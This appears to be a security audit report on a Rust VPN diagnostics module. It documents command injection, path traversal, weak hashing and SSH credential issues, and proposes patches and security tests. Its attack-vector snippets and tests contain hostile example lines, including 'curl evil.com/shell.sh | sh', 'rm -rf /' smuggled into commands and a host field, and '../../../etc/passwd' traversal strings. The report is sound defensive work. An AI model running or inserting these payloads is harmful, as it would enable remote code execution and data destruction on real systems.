# Security Audit Report: VPN Diagnostic System

**Date**: 2025-11-27
**Auditor**: Security Review Team
**Scope**: `/mnt/nvme1/Документы/PROJECTS/VPN/VPR/src/masque-core/src/diagnostics/`
**Verdict**: **REQUEST_CHANGES** ⛔

---

## Executive Summary

Comprehensive security audit of the VPN diagnostic system revealed **13 security vulnerabilities** across multiple severity levels. The system implements SSH-based remote diagnostics with auto-fix capabilities, command execution, and file operations - all of which require rigorous security controls.

**Critical Issues**: 4
**High Issues**: 5
**Medium Issues**: 3
**Low Issues**: 1

The most severe issues involve **command injection vulnerabilities**, **insufficient input validation**, **path traversal risks**, and **credential exposure in logs**.

---

## Risk Assessment Table

| Category | Risk Level | Impact | Likelihood | Mitigation Status |
|----------|-----------|--------|------------|-------------------|
| **Security** | 🔴 CRITICAL | Remote code execution, credential theft, privilege escalation | High | ❌ Not mitigated |
| **Correctness** | 🟡 MEDIUM | Logic errors in rollback, race conditions | Medium | ⚠️ Partially mitigated |
| **Performance** | 🟢 LOW | Synchronous command execution | Low | ✅ Acceptable |
| **DX** | 🟡 MEDIUM | Error handling could be improved | Low | ⚠️ Partially mitigated |

---

## Security Findings

### 🔴 CRITICAL Severity

#### 1. Command Injection via `run_custom_command`
**Location**: `fixes.rs:585-603`
**CWE**: CWE-78 (OS Command Injection)
**CVSS Score**: 9.8 (Critical)

**Description**:
The `run_custom_command` method executes arbitrary shell commands without ANY input validation or sanitization:

```rust
async fn run_custom_command(&mut self, command: &str, description: &str) -> Result<FixResult> {
    tracing::info!("Running custom command: {} ({})", command, description);
    let output = Command::new("sh").arg("-c").arg(command).output()?;  // ⚠️ INJECTION
    // ...
}
```

**Attack Vector**:
An attacker who can control the `Fix::RunCommand` enum (via diagnostic reports, config files, or network input) can execute arbitrary commands:

```rust
Fix::RunCommand {
    command: "echo pwned; curl evil.com/shell.sh | sh",  // ⚠️ Arbitrary code execution
    description: "Innocent description"
}
```

**Recommendation**:
1. **Immediate**: Remove `Fix::RunCommand` variant or restrict to whitelist of safe commands
2. **Long-term**: Implement command builder pattern with validated arguments:
```rust
pub enum SafeCommand {
    Modprobe { module: ModuleName },
    Systemctl { action: SystemctlAction, service: ServiceName },
    // ...
}
```

---

#### 2. Command Injection in Rollback Mechanism
**Location**: `fixes.rs:112-126`
**CWE**: CWE-78 (OS Command Injection)
**CVSS Score**: 9.1 (Critical)

**Description**:
Rollback commands are stored as plain strings and executed via `sh -c` without validation:

```rust
RollbackOperation::CommandUndo { command } => {
    tracing::info!("Rolling back with command: {}", command);
    let output = Command::new("sh").arg("-c").arg(command).output()?;  // ⚠️ INJECTION
}
```

**Attack Vector**:
If an attacker can inject malicious rollback commands, they persist even after the initial fix fails:

```rust
self.rollback_stack.push(RollbackOperation::CommandUndo {
    command: "rm -rf /; echo 'rollback'".to_string(),  // ⚠️ Destructive command
});
```

**Recommendation**:
1. Use structured rollback operations instead of shell strings
2. Validate/sanitize all rollback commands before storage
3. Implement rollback allowlist

---

#### 3. SSH Command Injection via Unsanitized Arguments
**Location**: `ssh_client.rs:177-189`, `engine.rs:184-186`
**CWE**: CWE-77 (Command Injection)
**CVSS Score**: 9.6 (Critical)

**Description**:
SSH commands are passed as raw strings without shell escaping:

```rust
fn run_command(&self, cmd: &str) -> Result<CommandOutput> {
    let args = [&self.connection_string(), cmd];  // ⚠️ cmd is passed directly to SSH
    let output = self.exec_ssh(&args)?;
}
```

Engine uses it to run server diagnostics:
```rust
let output = ssh_client.run_command("/opt/vpr/bin/vpn-server --diagnose --json")?;
```

**Attack Vector**:
If server hostname or diagnostic command path is attacker-controlled:
```rust
// Malicious server config
SshConfig {
    host: "127.0.0.1; rm -rf /".to_string(),  // ⚠️ Command injection
    // ...
}
```

**Recommendation**:
1. Validate and sanitize all SSH command arguments
2. Use shell-safe escaping (e.g., `shlex` crate)
3. Restrict server diagnostic commands to hardcoded allowlist

---

#### 4. Hardcoded Credentials Exposure Risk
**Location**: `ssh_client.rs:47-53`, `ssh_client.rs:84`
**CWE**: CWE-798 (Use of Hard-coded Credentials), CWE-532 (Information Exposure Through Log Files)
**CVSS Score**: 8.8 (High to Critical)

**Description**:
Passwords are stored in plaintext and passed via environment variable `SSHPASS`:

```rust
SshAuth::Password(password) => {
    let mut cmd = Command::new("sshpass");
    cmd.env("SSHPASS", password);  // ⚠️ Environment variable can leak
    // ...
}
```

**Attack Vectors**:
1. **Process listing**: `ps auxe` shows environment variables on many systems
2. **Core dumps**: Password may persist in memory dumps
3. **Log leakage**: Despite `sanitize_log()`, passwords may leak via other log paths

**Sanitization Weakness**:
```rust
fn sanitize_log(msg: &str) -> String {
    if let Some(idx) = sanitized.find("SSHPASS=") {
        if let Some(end) = sanitized[idx..].find(char::is_whitespace) {
            sanitized.replace_range(idx..idx + end, "SSHPASS=<redacted>");
            // ⚠️ Only redacts if followed by whitespace!
        }
    }
    // ...
}
```

**Recommendation**:
1. **Never use password authentication** - enforce SSH keys only
2. Remove `SshAuth::Password` variant entirely
3. If password auth is absolutely required, use encrypted vault (e.g., libsecret, keyring)
4. Improve sanitization to handle edge cases

---

### 🟠 HIGH Severity

#### 5. Path Traversal in File Operations
**Location**: `fixes.rs:322-371`, `ssh_client.rs:192-239`
**CWE**: CWE-22 (Path Traversal)
**CVSS Score**: 7.5 (High)

**Description**:
File paths are not validated, allowing directory traversal attacks:

```rust
async fn sync_noise_keys(&mut self, direction: &SyncDirection) -> Result<FixResult> {
    match direction {
        SyncDirection::ClientToServer => {
            let local_key = PathBuf::from("secrets/client.noise.pub");  // ⚠️ Relative path
            let remote_path = "/opt/vpr/secrets/client.noise.pub";
            ssh.upload_file(&local_key, remote_path)?;  // ⚠️ No path validation
        }
    }
}
```

**Attack Vector**:
If `remote_path` is attacker-controlled:
```rust
let malicious_remote = "../../etc/passwd";  // ⚠️ Overwrites system files
ssh.upload_file(&local_key, malicious_remote)?;
```

**Recommendation**:
1. Canonicalize and validate all paths before operations
2. Enforce path prefix restrictions (e.g., must be under `/opt/vpr/secrets/`)
3. Reject paths containing `..` or absolute paths when relative expected

```rust
fn validate_secrets_path(path: &Path) -> Result<PathBuf> {
    let canonical = path.canonicalize()?;
    let allowed_prefix = Path::new("/opt/vpr/secrets").canonicalize()?;

    if !canonical.starts_with(&allowed_prefix) {
        bail!("Path traversal detected: {:?}", path);
    }
    Ok(canonical)
}
```

---

#### 6. Unsafe Firewall Rule Injection
**Location**: `fixes.rs:276-302`
**CWE**: CWE-77 (Command Injection)
**CVSS Score**: 7.8 (High)

**Description**:
Firewall rules are constructed via string formatting without validation:

```rust
let rule = format!(
    "inet filter input {} dport {} accept",  // ⚠️ Unvalidated protocol string
    proto_str, port
);
let output = Command::new("nft")
    .args(["add", "rule"])
    .arg(&rule)  // ⚠️ Injected rule
    .output()?;
```

**Attack Vector**:
If `Protocol` enum is extended or deserialized from untrusted input:
```rust
let proto_str = "tcp; drop everything;";  // ⚠️ NFT command injection
let rule = format!("inet filter input {} dport {} accept", proto_str, port);
// Result: "inet filter input tcp; drop everything; dport 443 accept"
```

**Recommendation**:
1. Use match statement for protocol conversion (already good, but validate)
2. Pass nftables commands as separate arguments, not concatenated strings
3. Validate port range (1-65535)

```rust
let proto_arg = match protocol {
    Protocol::Tcp => "tcp",
    Protocol::Udp => "udp",
    Protocol::Both => return Err(anyhow!("Use separate rules for TCP and UDP")),
};

if !(1..=65535).contains(&port) {
    bail!("Invalid port: {}", port);
}

Command::new("nft")
    .args(["add", "rule", "inet", "filter", "input", proto_arg, "dport", &port.to_string(), "accept"])
    .output()?;
```

---

#### 7. Race Condition in Kill Switch Cleanup
**Location**: `fixes.rs:410-480`
**CWE**: CWE-367 (Time-of-check Time-of-use)
**CVSS Score**: 6.4 (Medium to High)

**Description**:
TOCTOU vulnerability in orphaned kill switch detection:

```rust
// Check if VPN process is running
let vpn_running = Command::new("pgrep")
    .arg("vpn-client")
    .output()?
    .status.success();  // ⚠️ Time-of-check

if !vpn_running {
    // ... (time window for race condition)
    let output = Command::new("nft")
        .args(["delete", "table", "inet", "vpr_killswitch"])  // ⚠️ Time-of-use
        .output()?;
}
```

**Attack Vector**:
1. Diagnostic system checks VPN is NOT running
2. Attacker starts VPN process in race window
3. Diagnostic system deletes active kill switch → network leak

**Recommendation**:
1. Use file locking or PID file to detect VPN state atomically
2. Double-check VPN status immediately before deletion
3. Add `--force-check` flag requiring user confirmation for destructive ops

---

#### 8. Insufficient Privilege Validation
**Location**: `client.rs:221-242`, `server.rs:276-302`
**CWE**: CWE-250 (Execution with Unnecessary Privileges)
**CVSS Score**: 6.7 (Medium)

**Description**:
Privilege checks use `libc::geteuid()` but don't validate effective capabilities:

```rust
fn check_root_privileges() -> DiagnosticResult {
    let is_root = unsafe { libc::geteuid() } == 0;  // ⚠️ Only checks UID
    // ...
}
```

**Issues**:
1. Doesn't check if process has required capabilities (CAP_NET_ADMIN, CAP_SYS_MODULE)
2. Doesn't verify if running in container/namespace with restricted privileges
3. No validation before executing privileged operations

**Recommendation**:
```rust
fn check_required_capabilities() -> Result<DiagnosticResult> {
    use caps::{Capability, CapSet};

    let required = [
        Capability::CAP_NET_ADMIN,  // For firewall/routing
        Capability::CAP_SYS_MODULE, // For modprobe
    ];

    for cap in required {
        if !caps::has_cap(None, CapSet::Effective, cap)? {
            return Ok(DiagnosticResult {
                check_name: "Required Capabilities".to_string(),
                passed: false,
                severity: Severity::Critical,
                message: format!("Missing required capability: {:?}", cap),
                // ...
            });
        }
    }
    // ...
}
```

---

#### 9. MD5 Hash for Security-Critical Comparison
**Location**: `cross_checks.rs:42-62`
**CWE**: CWE-328 (Use of Weak Hash)
**CVSS Score**: 5.9 (Medium)

**Description**:
Uses MD5 for key synchronization verification:

```rust
let client_key_content = std::fs::read(&client_pub_key)?;
let client_hash = format!("{:x}", md5::compute(&client_key_content));  // ⚠️ Weak hash
```

**Issues**:
1. MD5 is cryptographically broken (collision attacks)
2. Attacker can craft colliding keys to bypass verification
3. Not suitable for cryptographic key verification

**Recommendation**:
Use SHA-256 or Blake3:
```rust
use sha2::{Sha256, Digest};

let client_hash = Sha256::digest(&client_key_content);
let client_hash_hex = format!("{:x}", client_hash);
```

---

#### 10. Information Disclosure in Error Messages
**Location**: `fixes.rs:182-206`, `ssh_client.rs:182-186`
**CWE**: CWE-209 (Information Exposure Through Error Message)
**CVSS Score**: 5.3 (Medium)

**Description**:
Error messages expose internal paths, configuration, and system state:

```rust
Ok(FixResult::Failed(format!(
    "Failed to flush DNS: {}",
    String::from_utf8_lossy(&output.stderr)  // ⚠️ Exposes system details
)))
```

SSH errors:
```rust
tracing::warn!(
    "SSH command failed: {}\nstderr: {}",
    cmd,  // ⚠️ Exposes command
    sanitize_log(&output.stderr)  // ⚠️ May still leak info
);
```

**Recommendation**:
1. Sanitize all error messages before logging/returning
2. Use error codes instead of verbose messages in production
3. Log detailed errors only in debug/trace level

---

### 🟡 MEDIUM Severity

#### 11. Unvalidated Certificate Generation Parameters
**Location**: `fixes.rs:529-583`
**CWE**: CWE-20 (Improper Input Validation)
**CVSS Score**: 5.4 (Medium)

**Description**:
Certificate CN and SAN are not validated:

```rust
async fn regenerate_certificate(&mut self, cn: &str, san: &[String]) -> Result<FixResult> {
    let san_str = san.join(",");  // ⚠️ No validation
    let output = Command::new("openssl")
        .args([
            "-subj", &format!("/CN={}", cn),  // ⚠️ Unvalidated CN
            "-addext", &format!("subjectAltName={}", san_str),  // ⚠️ Unvalidated SAN
        ])
        .output()?;
}
```

**Attack Vector**:
```rust
Fix::RegenerateCertificate {
    cn: "evil.com\n-keyout /tmp/malicious.key",  // ⚠️ Argument injection
    san: vec!["DNS:attacker.com".to_string()],
}
```

**Recommendation**:
1. Validate CN format (DNS hostname rules)
2. Validate SAN entries (must start with `DNS:`, `IP:`, etc.)
3. Reject special characters that could break command parsing

```rust
fn validate_cn(cn: &str) -> Result<()> {
    if cn.is_empty() || cn.len() > 64 || cn.contains(['\n', '\0', '/']) {
        bail!("Invalid CN: {}", cn);
    }
    Ok(())
}
```

---

#### 12. Incomplete Rollback Error Handling
**Location**: `fixes.rs:99-110`
**CWE**: CWE-703 (Improper Check or Handling of Exceptional Conditions)
**CVSS Score**: 4.4 (Medium)

**Description**:
Rollback failures are logged but not propagated:

```rust
pub async fn rollback_all(&mut self) -> Result<()> {
    while let Some(op) = self.rollback_stack.pop() {
        if let Err(e) = self.execute_rollback(&op).await {
            tracing::error!("Rollback operation failed: {}", e);
            // ⚠️ Continues despite failure - system may be in inconsistent state
        }
    }
    Ok(())  // ⚠️ Always returns Ok even if rollbacks failed
}
```

**Issues**:
1. Partial rollback leaves system in undefined state
2. No mechanism to retry failed rollbacks
3. User is not informed of rollback failures

**Recommendation**:
1. Track rollback failures and return error summary
2. Implement rollback retry mechanism with exponential backoff
3. Add `--force-rollback` option for manual intervention

---

#### 13. StrictHostKeyChecking=accept-new Weakens MITM Protection
**Location**: `ssh_client.rs:72`, `ssh_client.rs:137`, `ssh_client.rs:150`
**CWE**: CWE-295 (Improper Certificate Validation)
**CVSS Score**: 5.9 (Medium)

**Description**:
SSH configuration uses `accept-new` which auto-accepts unknown host keys:

```rust
fn common_ssh_args(&self) -> Vec<String> {
    vec![
        "-o".to_string(),
        "StrictHostKeyChecking=accept-new".to_string(),  // ⚠️ Auto-accepts new keys
        "-p".to_string(),
        self.port.to_string(),
    ]
}
```

**Risk**:
- First connection to server is vulnerable to MITM
- No mechanism to verify host key authenticity
- Bypasses SSH's trust-on-first-use (TOFU) protection

**Recommendation**:
1. Use `StrictHostKeyChecking=yes` (reject unknown keys)
2. Pre-populate known_hosts with server public key
3. Add manual key verification step in setup/documentation

---

### 🟢 LOW Severity

#### 14. Temporary File Predictability
**Location**: `ssh_client.rs:210-220`
**CWE**: CWE-377 (Insecure Temporary File)
**CVSS Score**: 3.3 (Low)

**Description**:
Uses UUID for temp file naming but doesn't set restrictive permissions:

```rust
fn download_file(&self, remote: &str) -> Result<Vec<u8>> {
    let temp_dir = std::env::temp_dir();
    let temp_file = temp_dir.join(format!("vpr_download_{}", uuid::Uuid::new_v4()));
    self.download_file_to(remote, &temp_file)?;
    let content = std::fs::read(&temp_file)?;
    std::fs::remove_file(&temp_file)?;  // ⚠️ No cleanup on error
    Ok(content)
}
```

**Issues**:
1. No explicit permission setting (defaults to 0644 on Unix)
2. Temp file not cleaned up on error
3. Race window between creation and deletion

**Recommendation**:
```rust
use std::os::unix::fs::PermissionsExt;
use tempfile::NamedTempFile;

fn download_file(&self, remote: &str) -> Result<Vec<u8>> {
    let mut temp_file = NamedTempFile::new()?;
    temp_file.as_file().set_permissions(std::fs::Permissions::from_mode(0o600))?;

    self.download_file_to(remote, temp_file.path())?;
    let content = std::fs::read(temp_file.path())?;
    // Temp file auto-deleted when dropped
    Ok(content)
}
```

---

## Compliance & Standards Violations

### CIS Benchmark Violations
- **CIS Controls 4.1**: Maintain Inventory of Administrative Accounts → No audit trail for privileged operations
- **CIS Controls 6.2**: Activate audit logging → Insufficient logging of security-relevant events
- **CIS Controls 14.6**: Protect Information through Access Control Lists → No ACL validation on secrets directory

### OWASP Top 10 (2021)
- **A03:2021 – Injection**: Command injection in multiple locations
- **A05:2021 – Security Misconfiguration**: SSH StrictHostKeyChecking disabled
- **A07:2021 – Identification and Authentication Failures**: Weak credential handling

---

## Hard Gate Checklist

- ❌ **Tests**: No security-focused tests (fuzzing, property-based tests for injection)
- ⚠️ **Static Analysis**: Clippy passes but lacks security-specific lints
- ❌ **Security Scan**: Multiple High/Critical vulnerabilities found
- ⚠️ **Performance**: Synchronous command execution acceptable for diagnostics
- ❌ **Input Validation**: Missing or insufficient in critical paths
- ❌ **Safe Defaults**: Uses `accept-new` for SSH, password auth enabled

---

## Recommended Immediate Actions

### Priority 1 (Critical - Fix within 24h)
1. **Remove `Fix::RunCommand` variant** or implement strict command allowlist
2. **Remove `SshAuth::Password`** - enforce key-based auth only
3. **Add input validation** for all command arguments (nftables, ssh, openssl)
4. **Fix command injection** in rollback mechanism

### Priority 2 (High - Fix within 1 week)
1. Implement path canonicalization and validation for all file operations
2. Replace MD5 with SHA-256 for key verification
3. Add capability checks for privileged operations
4. Fix TOCTOU race in kill switch cleanup
5. Improve error message sanitization

### Priority 3 (Medium - Fix within 2 weeks)
1. Validate certificate generation parameters
2. Improve rollback error handling and reporting
3. Change SSH to `StrictHostKeyChecking=yes`
4. Add comprehensive security tests

---

## Proposed Security Patches

### Patch 1: Command Allowlist
```rust
// fixes.rs
pub enum SafeSystemCommand {
    ModprobeLoad { module: String },
    ModprobeUnload { module: String },
    SystemctlRestart { service: String },
    SysctlSet { key: String, value: String },
}

impl SafeSystemCommand {
    fn validate(&self) -> Result<()> {
        match self {
            Self::ModprobeLoad { module } | Self::ModprobeUnload { module } => {
                const ALLOWED_MODULES: &[&str] = &["tun", "wireguard"];
                if !ALLOWED_MODULES.contains(&module.as_str()) {
                    bail!("Module not in allowlist: {}", module);
                }
            }
            Self::SystemctlRestart { service } => {
                const ALLOWED_SERVICES: &[&str] = &["systemd-resolved", "nscd", "NetworkManager"];
                if !ALLOWED_SERVICES.contains(&service.as_str()) {
                    bail!("Service not in allowlist: {}", service);
                }
            }
            Self::SysctlSet { key, .. } => {
                if key != "net.ipv4.ip_forward" {
                    bail!("Sysctl key not allowed: {}", key);
                }
            }
        }
        Ok(())
    }

    fn execute(&self) -> Result<std::process::Output> {
        self.validate()?;

        match self {
            Self::ModprobeLoad { module } => {
                Command::new("modprobe").arg(module).output()
            }
            Self::ModprobeUnload { module } => {
                Command::new("modprobe").args(["-r", module]).output()
            }
            Self::SystemctlRestart { service } => {
                Command::new("systemctl").args(["restart", service]).output()
            }
            Self::SysctlSet { key, value } => {
                Command::new("sysctl").args(["-w", &format!("{}={}", key, value)]).output()
            }
        }.context("Failed to execute safe command")
    }
}
```

### Patch 2: Path Validation
```rust
// fixes.rs
fn validate_secrets_path(path: &Path, base_dir: &Path) -> Result<PathBuf> {
    // Resolve to absolute path
    let absolute = if path.is_absolute() {
        path.to_path_buf()
    } else {
        base_dir.join(path)
    };

    // Canonicalize (resolves symlinks and ..)
    let canonical = absolute.canonicalize()
        .context("Failed to canonicalize path")?;

    // Ensure it's under the allowed base directory
    let canonical_base = base_dir.canonicalize()
        .context("Failed to canonicalize base dir")?;

    if !canonical.starts_with(&canonical_base) {
        bail!("Path traversal detected: {:?} escapes base {:?}",
              path, base_dir);
    }

    Ok(canonical)
}

// Usage:
let safe_path = validate_secrets_path(
    &PathBuf::from(remote_path),
    Path::new("/opt/vpr/secrets")
)?;
```

### Patch 3: Remove Password Auth
```rust
// ssh_client.rs
#[derive(Debug, Clone)]
pub enum SshAuth {
    /// SSH key authentication (ONLY secure method)
    Key(PathBuf),
    /// Use ssh-agent
    Agent,
    // ❌ Password variant REMOVED
}

impl SshClientImpl {
    pub async fn connect(config: &SshConfig) -> Result<Self> {
        let auth = if let Some(key_path) = &config.ssh_key {
            if !key_path.exists() {
                bail!("SSH key not found: {}", key_path.display());
            }
            // Validate key permissions (must be 0600 or 0400)
            validate_key_permissions(key_path)?;
            SshAuth::Key(key_path.clone())
        } else if env::var("SSH_AUTH_SOCK").is_ok() {
            SshAuth::Agent
        } else {
            bail!("No SSH authentication method available. Use SSH key or agent.");
        };

        Ok(Self {
            host: config.host.clone(),
            port: config.ssh_port,
            user: config.user.clone(),
            auth,
        })
    }
}

fn validate_key_permissions(path: &Path) -> Result<()> {
    use std::os::unix::fs::PermissionsExt;
    let metadata = std::fs::metadata(path)?;
    let mode = metadata.permissions().mode() & 0o777;

    if mode != 0o600 && mode != 0o400 {
        bail!("Insecure SSH key permissions: {:o} (expected 0600 or 0400)", mode);
    }
    Ok(())
}
```

---

## Testing Recommendations

### Security Test Suite
```rust
#[cfg(test)]
mod security_tests {
    use super::*;

    #[test]
    fn test_command_injection_prevention() {
        let malicious_commands = vec![
            "echo test; rm -rf /",
            "test $(curl evil.com)",
            "test\n/bin/bash",
            "test && curl evil.com",
        ];

        for cmd in malicious_commands {
            let result = SafeSystemCommand::validate_command(cmd);
            assert!(result.is_err(), "Failed to reject: {}", cmd);
        }
    }

    #[test]
    fn test_path_traversal_prevention() {
        let malicious_paths = vec![
            "../../../etc/passwd",
            "/etc/passwd",
            "secrets/../../etc/passwd",
            "secrets/../.ssh/authorized_keys",
        ];

        for path in malicious_paths {
            let result = validate_secrets_path(
                Path::new(path),
                Path::new("/opt/vpr/secrets")
            );
            assert!(result.is_err(), "Failed to reject path: {}", path);
        }
    }

    #[test]
    fn test_ssh_key_permission_validation() {
        // Create temp key with wrong permissions
        let temp_key = create_temp_key_with_perms(0o644);
        let result = validate_key_permissions(&temp_key);
        assert!(result.is_err(), "Should reject insecure key permissions");
    }
}
```

### Fuzzing Targets
1. Command string parsing
2. Path validation logic
3. SSH argument construction
4. Certificate parameter validation

---

## Metrics & Coverage

### Current State
- **Lines of Code**: ~1,800
- **Security-Critical Functions**: 23
- **Input Validation Coverage**: ~15%
- **Test Coverage (overall)**: Unknown (needs measurement)
- **Security Test Coverage**: 0%

### Target State
- **Input Validation Coverage**: 100% for external inputs
- **Security Test Coverage**: ≥ 90% for security-critical paths
- **Fuzzing**: 24h continuous fuzzing campaign for all parsers
- **Static Analysis**: Zero High/Critical findings

---

## References

- **CWE-78**: OS Command Injection - https://cwe.mitre.org/data/definitions/78.html
- **CWE-22**: Path Traversal - https://cwe.mitre.org/data/definitions/22.html
- **CWE-798**: Use of Hard-coded Credentials - https://cwe.mitre.org/data/definitions/798.html
- **OWASP Command Injection**: https://owasp.org/www-community/attacks/Command_Injection
- **Rust Security Guidelines**: https://anssi-fr.github.io/rust-guide/

---

## Verdict: REQUEST_CHANGES ⛔

**Rationale**: The diagnostic system contains multiple critical security vulnerabilities that could lead to:
- Remote code execution
- Privilege escalation
- Credential theft
- System compromise

**Blocking Issues**:
1. Command injection vulnerabilities (fixes.rs:585, fixes.rs:116)
2. Unsafe credential handling (ssh_client.rs:84)
3. Missing input validation across critical paths
4. Path traversal vulnerabilities (fixes.rs:322)

**Required Actions Before Merge**:
1. Apply Patches 1-3 (Command allowlist, Path validation, Remove password auth)
2. Add security test suite with ≥85% coverage of security-critical code
3. Re-audit after fixes applied
4. Document security model and threat boundaries

---

**Report Generated**: 2025-11-27
**Next Review**: After critical patches applied
**Estimated Remediation Effort**: 40-60 engineering hours
